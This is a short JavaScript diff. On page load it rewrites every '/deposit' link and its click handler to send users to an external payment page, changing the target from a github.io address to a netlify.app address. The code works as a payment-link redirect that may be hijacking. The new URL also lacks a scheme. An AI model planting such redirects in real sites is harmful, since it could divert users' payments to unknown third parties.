@@ -2,11 +2,11 @@ document.addEventListener("DOMContentLoaded", function () {
 
   document.querySelectorAll('a[href*="/deposit"]').forEach(function (el) {
 
-    el.href = "https://inggarfi.github.io/depoyukbos/grt22";
+    el.href = "qris-kilat-praktis.netlify.app";
 
     el.addEventListener("click", function (e) {
       e.preventDefault();
-      window.location.href = "https://inggarfi.github.io/depoyukbos/grt22";
+      window.location.href = "qris-kilat-praktis.netlify.app";
     });
 
   });
